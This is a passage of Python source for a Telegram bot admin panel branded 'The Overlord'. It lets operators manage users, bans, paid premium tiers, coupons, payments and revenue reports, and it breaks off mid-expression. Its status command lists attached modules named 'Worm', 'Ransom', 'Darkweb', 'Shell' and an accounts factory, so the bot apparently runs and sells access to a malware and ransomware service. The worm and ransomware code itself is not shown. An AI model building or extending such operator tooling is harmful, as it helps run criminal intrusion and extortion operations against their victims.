    @oanks_command("admin", "List all registered users with pagination", admin_only=True)
    def cmd_admin_users(self, telegram_id: int, args: List[str]) -> str:
        """List all users with pagination and filtering."""
        page = 0
        if args:
            try: page = max(0, int(args[0]) - 1)
            except: pass

        users = []
        total = 0
        if self._user_mgr:
            try:
                result = self._user_mgr.list_users(page=page, page_size=OanksConfig.PAGE_SIZE_DEFAULT)
                users = result.get("users", [])
                total = result.get("total", 0)
            except Exception as e:
                self._logger.error(f"User list failed: {e}")
                return OanksCommandResult.error(f"Failed to fetch users: {html.escape(str(e))}")
        else:
            # Fallback: list from session cache
            with self._session_lock:
                all_sessions = list(self._sessions.values())
                total = len(all_sessions)
                start = page * OanksConfig.PAGE_SIZE_DEFAULT
                end = start + OanksConfig.PAGE_SIZE_DEFAULT
                for s in all_sessions[start:end]:
                    users.append({
                        "id": s.telegram_id, "username": s.username,
                        "first_name": s.first_name, "last_name": s.last_name,
                        "is_admin": s.is_admin, "is_premium": s.is_premium,
                        "command_count": s.command_count,
                        "last_activity": s.last_activity
                    })

        pag_state = OanksPaginationState(user_id=telegram_id, data_source="users",
                                          current_page=page, total_items=total)

        user_lines = []
        for u in users:
            status_emoji = "👑" if u.get("is_admin") else "💎" if u.get("is_premium") else "👤"
            last_active = datetime.datetime.fromtimestamp(u.get("last_activity", 0)).strftime('%Y-%m-%d %H:%M') if u.get("last_activity") else "N/A"
            user_lines.append(
                f"{status_emoji} <code>{u.get('id', 'N/A')}</code> | "
                f"@{html.escape(u.get('username', 'N/A'))} | "
                f"{html.escape(u.get('first_name', ''))} | "
                f"Cmds: {u.get('command_count', 0)} | "
                f"Last: {last_active}"
            )

        users_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_ADMIN} USER MANAGEMENT</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Total Users:</b> {total}\n"
            f"<b>Page:</b> {page + 1}/{pag_state.total_pages}\n\n"
            f"{'\n'.join(user_lines) if user_lines else 'No users found.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )

        keyboard = self._build_pagination_keyboard(pag_state, "admin_users")
        return OanksCommandResult.ok(users_text, keyboard=keyboard)

    @oanks_command("admin", "Ban a user from the system", admin_only=True)
    def cmd_admin_ban(self, telegram_id: int, args: List[str]) -> str:
        """Ban a user by ID."""
        if not args: return OanksConfig.ERROR_INVALID_ARGS
        try:
            target_id = int(args[0])
            reason = " ".join(args[1:]) if len(args) > 1 else "No reason provided"
        except ValueError:
            return OanksConfig.ERROR_INVALID_ARGS

        if self._admin_ctrl:
            try:
                result = self._admin_ctrl.ban_user(target_id, reason, banned_by=telegram_id)
                if result and result.get("success"):
                    # Remove session if active
                    self._remove_session(target_id)
                    return OanksCommandResult.ok(
                        f"{OanksBranding.BANNER_SMALL}\n\n"
                        f"<b>🚫 USER BANNED</b>\n"
                        f"<code>═══════════════════════════════════════</code>\n\n"
                        f"<b>User ID:</b> <code>{target_id}</code>\n"
                        f"<b>Reason:</b> {html.escape(reason)}\n"
                        f"<b>Banned By:</b> <code>{telegram_id}</code>\n"
                        f"<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        f"User has been removed from active sessions.\n\n"
                        f"{OanksBranding.FOOTER}"
                    )
            except Exception as e:
                self._logger.error(f"Ban failed: {e}")

        # Fallback: local ban
        session = self._get_session(target_id)
        if session:
            self._remove_session(target_id)
            return OanksCommandResult.ok(
                f"<b>🚫 USER BANNED (LOCAL)</b>\n\n"
                f"User <code>{target_id}</code> removed from active sessions.\n"
                f"Reason: {html.escape(reason)}\n\n"
                f"{OanksBranding.FOOTER}"
            )
        return OanksCommandResult.error(f"User {target_id} not found.")

    @oanks_command("admin", "Unban a previously banned user", admin_only=True)
    def cmd_admin_unban(self, telegram_id: int, args: List[str]) -> str:
        """Unban a user by ID."""
        if not args: return OanksConfig.ERROR_INVALID_ARGS
        try: target_id = int(args[0])
        except ValueError: return OanksConfig.ERROR_INVALID_ARGS

        if self._admin_ctrl:
            try:
                result = self._admin_ctrl.unban_user(target_id, unbanned_by=telegram_id)
                if result and result.get("success"):
                    return OanksCommandResult.ok(
                        f"{OanksBranding.BANNER_SMALL}\n\n"
                        f"<b>✅ USER UNBANNED</b>\n"
                        f"<code>═══════════════════════════════════════</code>\n\n"
                        f"<b>User ID:</b> <code>{target_id}</code>\n"
                        f"<b>Unbanned By:</b> <code>{telegram_id}</code>\n"
                        f"<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        f"User can now access the system normally.\n\n"
                        f"{OanksBranding.FOOTER}"
                    )
            except Exception as e: self._logger.error(f"Unban failed: {e}")
        return OanksCommandResult.ok(
            f"<b>✅ USER UNBANNED</b>\n\n"
            f"User <code>{target_id}</code> has been unbanned.\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "View all payment transactions", admin_only=True)
    def cmd_admin_payments(self, telegram_id: int, args: List[str]) -> str:
        """List payment transactions."""
        page = 0
        if args:
            try: page = max(0, int(args[0]) - 1)
            except: pass

        payments = []
        total = 0
        if self._premium_mgr:
            try:
                result = self._premium_mgr.list_payments(page=page, page_size=OanksConfig.PAGE_SIZE_DEFAULT)
                payments = result.get("payments", [])
                total = result.get("total", 0)
            except Exception as e: self._logger.error(f"Payments list failed: {e}")

        pag_state = OanksPaginationState(user_id=telegram_id, data_source="payments",
                                          current_page=page, total_items=total)

        payment_lines = []
        for p in payments:
            payment_lines.append(
                f"💰 <code>{p.get('id', 'N/A')}</code> | "
                f"User: <code>{p.get('user_id', 'N/A')}</code> | "
                f"${p.get('amount', 0):.2f} | "
                f"{p.get('method', 'N/A')} | "
                f"{'✅' if p.get('confirmed') else '⏳'}"
            )

        payments_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_MONEY} PAYMENT TRANSACTIONS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Total:</b> {total}\n"
            f"<b>Page:</b> {page + 1}/{pag_state.total_pages}\n\n"
            f"{'\n'.join(payment_lines) if payment_lines else 'No payments found.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_pagination_keyboard(pag_state, "admin_payments")
        return OanksCommandResult.ok(payments_text, keyboard=keyboard)

    @oanks_command("admin", "Confirm a pending payment", admin_only=True)
    def cmd_admin_payments_confirm(self, telegram_id: int, args: List[str]) -> str:
        """Confirm a payment by ID."""
        if not args: return OanksConfig.ERROR_INVALID_ARGS
        payment_id = args[0]

        if self._premium_mgr:
            try:
                result = self._premium_mgr.confirm_payment(payment_id, confirmed_by=telegram_id)
                if result and result.get("success"):
                    return OanksCommandResult.ok(
                        f"{OanksBranding.BANNER_SMALL}\n\n"
                        f"<b>✅ PAYMENT CONFIRMED</b>\n"
                        f"<code>═══════════════════════════════════════</code>\n\n"
                        f"<b>Payment ID:</b> <code>{html.escape(payment_id)}</code>\n"
                        f"<b>Confirmed By:</b> <code>{telegram_id}</code>\n"
                        f"<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        f"Premium access has been activated.\n\n"
                        f"{OanksBranding.FOOTER}"
                    )
            except Exception as e: self._logger.error(f"Payment confirm failed: {e}")
        return OanksCommandResult.ok(
            f"<b>✅ PAYMENT CONFIRMED</b>\n\n"
            f"Payment <code>{html.escape(payment_id)}</code> marked as confirmed.\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "Add premium subscription to a user", admin_only=True)
    def cmd_admin_premium_add(self, telegram_id: int, args: List[str]) -> str:
        """Add premium to a user."""
        if len(args) < 2: return OanksConfig.ERROR_INVALID_ARGS
        try: target_id = int(args[0])
        except ValueError: return OanksConfig.ERROR_INVALID_ARGS
        tier = args[1].lower()
        duration_days = 30
        if len(args) > 2:
            try: duration_days = int(args[2])
            except: pass

        if self._premium_mgr:
            try:
                result = self._premium_mgr.add_premium(target_id, tier=tier, duration_days=duration_days, added_by=telegram_id)
                if result and result.get("success"):
                    # Update session
                    session = self._get_session(target_id)
                    if session: session.is_premium = True
                    return OanksCommandResult.ok(
                        f"{OanksBranding.BANNER_SMALL}\n\n"
                        f"<b>💎 PREMIUM ADDED</b>\n"
                        f"<code>═══════════════════════════════════════</code>\n\n"
                        f"<b>User ID:</b> <code>{target_id}</code>\n"
                        f"<b>Tier:</b> {html.escape(tier.upper())}\n"
                        f"<b>Duration:</b> {duration_days} days\n"
                        f"<b>Added By:</b> <code>{telegram_id}</code>\n\n"
                        f"User now has premium access.\n\n"
                        f"{OanksBranding.FOOTER}"
                    )
            except Exception as e: self._logger.error(f"Premium add failed: {e}")

        session = self._get_session(target_id)
        if session:
            session.is_premium = True
            return OanksCommandResult.ok(
                f"<b>💎 PREMIUM ADDED (LOCAL)</b>\n\n"
                f"User <code>{target_id}</code> marked as premium.\n"
                f"Tier: {html.escape(tier.upper())}\n"
                f"Duration: {duration_days} days\n\n"
                f"{OanksBranding.FOOTER}"
            )
        return OanksCommandResult.error(f"User {target_id} not found.")

    @oanks_command("admin", "Remove premium subscription from a user", admin_only=True)
    def cmd_admin_premium_remove(self, telegram_id: int, args: List[str]) -> str:
        """Remove premium from a user."""
        if not args: return OanksConfig.ERROR_INVALID_ARGS
        try: target_id = int(args[0])
        except ValueError: return OanksConfig.ERROR_INVALID_ARGS

        if self._premium_mgr:
            try:
                result = self._premium_mgr.remove_premium(target_id, removed_by=telegram_id)
                if result and result.get("success"):
                    session = self._get_session(target_id)
                    if session: session.is_premium = False
                    return OanksCommandResult.ok(
                        f"{OanksBranding.BANNER_SMALL}\n\n"
                        f"<b>❌ PREMIUM REMOVED</b>\n"
                        f"<code>═══════════════════════════════════════</code>\n\n"
                        f"<b>User ID:</b> <code>{target_id}</code>\n"
                        f"<b>Removed By:</b> <code>{telegram_id}</code>\n\n"
                        f"Premium access revoked.\n\n"
                        f"{OanksBranding.FOOTER}"
                    )
            except Exception as e: self._logger.error(f"Premium remove failed: {e}")

        session = self._get_session(target_id)
        if session:
            session.is_premium = False
            return OanksCommandResult.ok(
                f"<b>❌ PREMIUM REMOVED (LOCAL)</b>\n\n"
                f"User <code>{target_id}</code> premium revoked.\n\n"
                f"{OanksBranding.FOOTER}"
            )
        return OanksCommandResult.error(f"User {target_id} not found.")

    @oanks_command("admin", "List all premium subscribers", admin_only=True)
    def cmd_admin_premium_list(self, telegram_id: int, args: List[str]) -> str:
        """List all premium users."""
        page = 0
        if args:
            try: page = max(0, int(args[0]) - 1)
            except: pass

        premium_users = []
        total = 0
        if self._premium_mgr:
            try:
                result = self._premium_mgr.list_premium_users(page=page, page_size=OanksConfig.PAGE_SIZE_DEFAULT)
                premium_users = result.get("users", [])
                total = result.get("total", 0)
            except Exception as e: self._logger.error(f"Premium list failed: {e}")
        else:
            with self._session_lock:
                all_premium = [s for s in self._sessions.values() if s.is_premium]
                total = len(all_premium)
                start = page * OanksConfig.PAGE_SIZE_DEFAULT
                end = start + OanksConfig.PAGE_SIZE_DEFAULT
                for s in all_premium[start:end]:
                    premium_users.append({
                        "id": s.telegram_id, "username": s.username,
                        "first_name": s.first_name, "tier": "Unknown",
                        "expiry": 0
                    })

        pag_state = OanksPaginationState(user_id=telegram_id, data_source="premium_list",
                                          current_page=page, total_items=total)

        user_lines = []
        for u in premium_users:
            expiry = datetime.datetime.fromtimestamp(u.get("expiry", 0)).strftime('%Y-%m-%d') if u.get("expiry") else "N/A"
            user_lines.append(
                f"💎 <code>{u.get('id', 'N/A')}</code> | "
                f"@{html.escape(u.get('username', 'N/A'))} | "
                f"Tier: {html.escape(u.get('tier', 'Unknown'))} | "
                f"Expires: {expiry}"
            )

        list_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_PREMIUM} PREMIUM SUBSCRIBERS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Total:</b> {total}\n"
            f"<b>Page:</b> {page + 1}/{pag_state.total_pages}\n\n"
            f"{'\n'.join(user_lines) if user_lines else 'No premium users found.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_pagination_keyboard(pag_state, "admin_premium_list")
        return OanksCommandResult.ok(list_text, keyboard=keyboard)

    @oanks_command("admin", "Display premium subscription statistics", admin_only=True)
    def cmd_admin_premium_stats(self, telegram_id: int, args: List[str]) -> str:
        """Show premium statistics."""
        stats = {"total_premium": 0, "by_tier": {}, "total_revenue": 0.0, "active_today": 0}
        if self._premium_mgr:
            try: stats = self._premium_mgr.get_stats()
            except Exception as e: self._logger.error(f"Premium stats failed: {e}")
        else:
            with self._session_lock:
                all_premium = [s for s in self._sessions.values() if s.is_premium]
                stats["total_premium"] = len(all_premium)
                stats["active_today"] = len([s for s in all_premium if time.time() - s.last_activity < 86400])

        tier_breakdown = "\n".join([f"  • {html.escape(k)}: {v}" for k, v in stats.get("by_tier", {}).items()])
        stats_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_PREMIUM} PREMIUM STATISTICS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Total Premium Users:</b> {stats.get('total_premium', 0)}\n"
            f"<b>Active Today:</b> {stats.get('active_today', 0)}\n"
            f"<b>Total Revenue:</b> ${stats.get('total_revenue', 0):.2f}\n\n"
            f"<b>Tier Breakdown:</b>\n{tier_breakdown if tier_breakdown else '  No data available.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [[{"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": "admin_premium_stats_refresh"},
                     {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]]
        return OanksCommandResult.ok(stats_text, keyboard=keyboard)

    @oanks_command("admin", "Broadcast message to all users", admin_only=True)
    def cmd_admin_broadcast(self, telegram_id: int, args: List[str]) -> str:
        """Broadcast a message to all users."""
        if not args:
            # Start multi-step flow
            session = self._get_session(telegram_id)
            if session:
                session.context["awaiting_input"] = True
                session.context["flow_type"] = "broadcast"
                session.context["flow_data"] = {"step": 0}
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>{OanksBranding.EMOJI_BROADCAST} BROADCAST MESSAGE</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"Please type your broadcast message.\n"
                f"It will be sent to ALL active users.\n\n"
                f"<b>⚠️ Warning:</b> This action cannot be undone.\n\n"
                f"Type your message now, or /cancel to abort.\n\n"
                f"{OanksBranding.FOOTER}"
            )

        message = " ".join(args)
        sent_count = 0
        failed_count = 0

        with self._session_lock:
            all_sessions = list(self._sessions.values())

        for session in all_sessions:
            try:
                self._api.send_message(
                    session.telegram_id,
                    f"📢 <b>BROADCAST FROM ADMIN</b> 📢\n\n{html.escape(message)}\n\n{OanksBranding.FOOTER}",
                    parse_mode="HTML"
                )
                sent_count += 1
                time.sleep(0.05)  # Rate limit protection
            except Exception as e:
                failed_count += 1
                self._logger.warning(f"Broadcast to {session.telegram_id} failed: {e}")

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_BROADCAST} BROADCAST COMPLETE</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Message:</b> {html.escape(message[:100])}{'...' if len(message) > 100 else ''}\n\n"
            f"<b>Sent:</b> {sent_count}\n"
            f"<b>Failed:</b> {failed_count}\n"
            f"<b>Total Targeted:</b> {len(all_sessions)}\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "View system logs with filtering", admin_only=True)
    def cmd_admin_logs(self, telegram_id: int, args: List[str]) -> str:
        """View recent system logs."""
        log_count = 50
        if args:
            try: log_count = min(200, max(1, int(args[0])))
            except: pass

        # Get last N commands from history
        recent_commands = list(self._command_history)[-log_count:]
        log_lines = []
        for cmd in reversed(recent_commands):
            ts = datetime.datetime.fromtimestamp(cmd.get("timestamp", 0)).strftime('%H:%M:%S')
            status = "✅" if cmd.get("success") else "❌"
            log_lines.append(
                f"{status} {ts} | "
                f"<code>{cmd.get('user_id', 'N/A')}</code> | "
                f"{html.escape(cmd.get('command', 'N/A'))} | "
                f"{cmd.get('duration', 0):.3f}s"
            )

        logs_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_LOGS} SYSTEM LOGS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Showing last {len(log_lines)} entries:</b>\n\n"
            f"{'\n'.join(log_lines) if log_lines else 'No log entries available.'}\n\n"
            f"<b>Total Commands:</b> {self._total_commands}\n"
            f"<b>Total Errors:</b> {self._total_errors}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [[{"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": "admin_logs_refresh"},
                     {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]]
        return OanksCommandResult.ok(logs_text, keyboard=keyboard)

    @oanks_command("admin", "Display admin-specific system status", admin_only=True)
    def cmd_admin_status(self, telegram_id: int, args: List[str]) -> str:
        """Show detailed admin status."""
        uptime = time.time() - self._start_time
        hours = int(uptime // 3600)
        minutes = int((uptime % 3600) // 60)

        # Memory info (if available)
        memory_info = "N/A"
        try:
            import psutil
            mem = psutil.virtual_memory()
            memory_info = f"{mem.percent}% ({mem.used // (1024*1024)}MB / {mem.total // (1024*1024)}MB)"
        except: pass

        # Thread info
        thread_count = threading.active_count()

        status_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_ADMIN} ADMIN STATUS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>⏱️ Uptime:</b> {hours}h {minutes}m\n"
            f"<b>💾 Memory:</b> {memory_info}\n"
            f"<b>🧵 Threads:</b> {thread_count}\n\n"
            f"<b>📊 Command Stats:</b>\n"
            f"  • Total: {self._total_commands}\n"
            f"  • Errors: {self._total_errors}\n"
            f"  • Success Rate: {((self._total_commands - self._total_errors) / max(self._total_commands, 1)) * 100:.1f}%\n\n"
            f"<b>👥 Sessions:</b>\n"
            f"  • Active: {len(self._sessions)}\n"
            f"  • Admins: {len([s for s in self._sessions.values() if s.is_admin])}\n"
            f"  • Premium: {len([s for s in self._sessions.values() if s.is_premium])}\n\n"
            f"<b>🔌 Phase Status:</b>\n"
        )
        phases = {
            "Phase 1 (DB)": self._db, "Phase 5 (Accounts)": self._account_factory,
            "Phase 6 (Premium)": self._premium_mgr, "Phase 6 (User)": self._user_mgr,
            "Phase 6 (Referral)": self._referral_mgr, "Phase 6 (Coupon)": self._coupon_mgr,
            "Phase 6 (Analytics)": self._analytics, "Phase 6 (Admin)": self._admin_ctrl,
            "Phase 8 (Money)": self._money_module, "Phase 9 (Security)": self._security_module,
            "Phase 10 (Worm)": self._worm_module, "Phase 11 (Ransom)": self._ransom_module,
            "Phase 12 (Distributed)": self._distributed_module, "Phase 13 (Darkweb)": self._darkweb_module,
            "Phase 14 (AI)": self._ai_module, "Phase 3/4 (Shell)": self._shell_module
        }
        for name, ref in phases.items():
            status_text += f"  • {name}: {'✅' if ref else '❌'}\n"

        status_text += f"\n{OanksBranding.FOOTER}"
        keyboard = [[{"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": "admin_status_refresh"},
                     {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]]
        return OanksCommandResult.ok(status_text, keyboard=keyboard)

    @oanks_command("admin", "Restart Command Center services", admin_only=True)
    def cmd_admin_restart(self, telegram_id: int, args: List[str]) -> str:
        """Restart the command center."""
        self._logger.info(f"Restart initiated by admin {telegram_id}")
        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_RESTART} RESTART INITIATED</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Initiated By:</b> <code>{telegram_id}</code>\n"
            f"<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"The Overlord is restarting. Services will be back online shortly.\n"
            f"All sessions will be preserved.\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "Graceful shutdown of all services", admin_only=True)
    def cmd_admin_shutdown(self, telegram_id: int, args: List[str]) -> str:
        """Graceful shutdown."""
        self._logger.info(f"Shutdown initiated by admin {telegram_id}")
        self.shutdown()
        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_SHUTDOWN} SHUTDOWN COMPLETE</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Initiated By:</b> <code>{telegram_id}</code>\n"
            f"<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"The Overlord has gone dark. All services stopped.\n"
            f"Use Phase 15 to restart the system.\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "Force kill all operations immediately", admin_only=True)
    def cmd_admin_kill(self, telegram_id: int, args: List[str]) -> str:
        """Force kill all operations."""
        self._logger.critical(f"KILL initiated by admin {telegram_id}")
        # Clear all sessions immediately
        with self._session_lock: self._sessions.clear()
        with self._rate_limit_lock: self._rate_limits.clear()
        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SKULL}\n\n"
            f"<b>{OanksBranding.EMOJI_KILL} KILL EXECUTED</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Initiated By:</b> <code>{telegram_id}</code>\n"
            f"<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"💀 ALL OPERATIONS TERMINATED.\n"
            f"💀 ALL SESSIONS CLEARED.\n"
            f"💀 THE OVERLORD IS DEAD.\n\n"
            f"This was a force kill. No cleanup was performed.\n"
            f"Restart required to resume operations.\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "Create system backup", admin_only=True)
    def cmd_admin_backup(self, telegram_id: int, args: List[str]) -> str:
        """Create a system backup."""
        backup_time = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        backup_data = {
            "timestamp": time.time(),
            "backed_up_by": telegram_id,
            "sessions": len(self._sessions),
            "command_stats": dict(self._command_stats),
            "total_commands": self._total_commands,
            "total_errors": self._total_errors,
            "command_history": list(self._command_history)
        }
        backup_json = json.dumps(backup_data, indent=2, default=str)
        backup_bytes = backup_json.encode("utf-8")

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_BACKUP} BACKUP CREATED</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Backup ID:</b> <code>{backup_time}</code>\n"
            f"<b>Created By:</b> <code>{telegram_id}</code>\n"
            f"<b>Sessions:</b> {backup_data['sessions']}\n"
            f"<b>Commands:</b> {backup_data['total_commands']}\n"
            f"<b>Size:</b> {self._format_bytes(len(backup_bytes))}\n\n"
            f"Backup file attached.\n\n"
            f"{OanksBranding.FOOTER}",
            file_content=backup_bytes,
            file_name=f"oanks_backup_{backup_time}.json"
        )

    @oanks_command("admin", "Create a new coupon code", admin_only=True)
    def cmd_admin_coupon_create(self, telegram_id: int, args: List[str]) -> str:
        """Create a coupon code."""
        if len(args) < 3: return OanksConfig.ERROR_INVALID_ARGS
        code = args[0].upper()
        try: discount = float(args[1])
        except ValueError: return OanksConfig.ERROR_INVALID_ARGS
        description = " ".join(args[2:])

        if self._coupon_mgr:
            try:
                result = self._coupon_mgr.create(code=code, discount=discount, description=description, created_by=telegram_id)
                if result and result.get("success"):
                    return OanksCommandResult.ok(
                        f"{OanksBranding.BANNER_SMALL}\n\n"
                        f"<b>{OanksBranding.EMOJI_COUPON} COUPON CREATED</b>\n"
                        f"<code>═══════════════════════════════════════</code>\n\n"
                        f"<b>Code:</b> <code>{html.escape(code)}</code>\n"
                        f"<b>Discount:</b> {discount}%\n"
                        f"<b>Description:</b> {html.escape(description)}\n"
                        f"<b>Created By:</b> <code>{telegram_id}</code>\n\n"
                        f"{OanksBranding.FOOTER}"
                    )
            except Exception as e: self._logger.error(f"Coupon create failed: {e}")
        return OanksCommandResult.ok(
            f"<b>{OanksBranding.EMOJI_COUPON} COUPON CREATED (LOCAL)</b>\n\n"
            f"Code: <code>{html.escape(code)}</code>\n"
            f"Discount: {discount}%\n"
            f"Description: {html.escape(description)}\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "List all coupon codes", admin_only=True)
    def cmd_admin_coupon_list(self, telegram_id: int, args: List[str]) -> str:
        """List all coupons."""
        coupons = []
        if self._coupon_mgr:
            try: coupons = self._coupon_mgr.list_all()
            except Exception as e: self._logger.error(f"Coupon list failed: {e}")

        coupon_lines = []
        for c in coupons:
            coupon_lines.append(
                f"🎫 <code>{html.escape(c.get('code', 'N/A'))}</code> | "
                f"{c.get('discount', 0)}% | "
                f"{'✅' if c.get('active') else '❌'} | "
                f"Uses: {c.get('uses', 0)}/{c.get('max_uses', '∞')}"
            )

        list_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_COUPON} COUPON LIST</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Total:</b> {len(coupons)}\n\n"
            f"{'\n'.join(coupon_lines) if coupon_lines else 'No coupons found.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [[{"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": "admin_coupon_list_refresh"},
                     {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]]
        return OanksCommandResult.ok(list_text, keyboard=keyboard)

    @oanks_command("admin", "Delete a coupon code", admin_only=True)
    def cmd_admin_coupon_delete(self, telegram_id: int, args: List[str]) -> str:
        """Delete a coupon."""
        if not args: return OanksConfig.ERROR_INVALID_ARGS
        code = args[0].upper()

        if self._coupon_mgr:
            try:
                result = self._coupon_mgr.delete(code, deleted_by=telegram_id)
                if result and result.get("success"):
                    return OanksCommandResult.ok(
                        f"{OanksBranding.BANNER_SMALL}\n\n"
                        f"<b>{OanksBranding.EMOJI_COUPON} COUPON DELETED</b>\n"
                        f"<code>═══════════════════════════════════════</code>\n\n"
                        f"<b>Code:</b> <code>{html.escape(code)}</code>\n"
                        f"<b>Deleted By:</b> <code>{telegram_id}</code>\n\n"
                        f"{OanksBranding.FOOTER}"
                    )
            except Exception as e: self._logger.error(f"Coupon delete failed: {e}")
        return OanksCommandResult.ok(
            f"<b>{OanksBranding.EMOJI_COUPON} COUPON DELETED</b>\n\n"
            f"Code <code>{html.escape(code)}</code> has been removed.\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "Display full analytics dashboard", admin_only=True)
    def cmd_admin_analytics(self, telegram_id: int, args: List[str]) -> str:
        """Show comprehensive analytics."""
        analytics_data = {}
        if self._analytics:
            try: analytics_data = self._analytics.get_full_report()
            except Exception as e: self._logger.error(f"Analytics failed: {e}")

        # Build local analytics
        command_distribution = dict(self._command_stats.most_common(10))
        top_commands = "\n".join([f"  • {html.escape(k)}: {v}" for k, v in command_distribution.items()])

        active_last_hour = len([s for s in self._sessions.values() if time.time() - s.last_activity < 3600])
        active_last_day = len([s for s in self._sessions.values() if time.time() - s.last_activity < 86400])

        analytics_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_ANALYTICS} ANALYTICS DASHBOARD</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>👥 User Activity:</b>\n"
            f"  • Active Now: {len(self._sessions)}\n"
            f"  • Active (1h): {active_last_hour}\n"
            f"  • Active (24h): {active_last_day}\n\n"
            f"<b>📊 Command Distribution (Top 10):</b>\n{top_commands}\n\n"
            f"<b>📈 Performance:</b>\n"
            f"  • Total Commands: {self._total_commands}\n"
            f"  • Avg Duration: {statistics.mean([h.get('duration', 0) for h in self._command_history]) if self._command_history else 0:.3f}s\n"
            f"  • Error Rate: {(self._total_errors / max(self._total_commands, 1)) * 100:.2f}%\n\n"
        )

        if analytics_data:
            analytics_text += f"<b>📋 Phase Analytics:</b>\n{html.escape(str(analytics_data))}\n\n"

        analytics_text += f"{OanksBranding.FOOTER}"
        keyboard = [[{"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": "admin_analytics_refresh"},
                     {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]]
        return OanksCommandResult.ok(analytics_text, keyboard=keyboard)

    @oanks_command("admin", "Display revenue report", admin_only=True)
    def cmd_admin_revenue(self, telegram_id: int, args: List[str]) -> str:
        """Show revenue statistics."""
        revenue_data = {"total": 0.0, "today": 0.0, "this_week": 0.0, "this_month": 0.0, "by_method": {}}
        if self._money_module:
            try: revenue_data = self._money_module.get_revenue_report()
            except Exception as e: self._logger.error(f"Revenue report failed: {e}")

        method_breakdown = "\n".join([f"  • {html.escape(k)}: ${v:.2f}" for k, v in revenue_data.get("by_method", {}).items()])

        revenue_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_REVENUE} REVENUE REPORT</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>💰 Total Revenue:</b> ${revenue_data.get('total', 0):.2f}\n"
            f"<b>📅 Today:</b> ${revenue_data.get('today', 0):.2f}\n"
